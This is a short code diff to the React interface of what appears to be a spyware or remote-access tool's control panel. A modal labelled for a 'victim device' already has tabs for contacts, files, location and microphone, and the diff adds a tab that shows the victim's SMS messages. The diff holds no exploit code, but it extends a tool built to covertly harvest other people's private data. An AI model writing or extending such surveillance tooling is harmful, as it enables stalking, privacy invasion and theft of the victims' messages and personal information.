@@ -31,6 +31,7 @@ import { ContactsTab } from './ContactsTab';
 import { FileManagerTab } from './FileManagerTab';
 import { LocationTab } from './LocationTab';
 import { MicrophoneTab } from './MicrophoneTab';
+import { SMSTab } from './SMSTab';
 
 interface IProps {
     data?: VictimDeviceStore;
@@ -129,6 +130,8 @@ export const VictimDeviceModal: React.FC<IProps> = observer((props) => {
                                 <LocationTab data={props.data} />
                             ) : selectedTab === VictimOrder.CONTACTS ? (
                                 <ContactsTab data={props.data} />
+                            ) : selectedTab === VictimOrder.SMS ? (
+                                <SMSTab data={props.data} />
                             ) : null)}
                     </DialogContent>
                 </DialogBody>
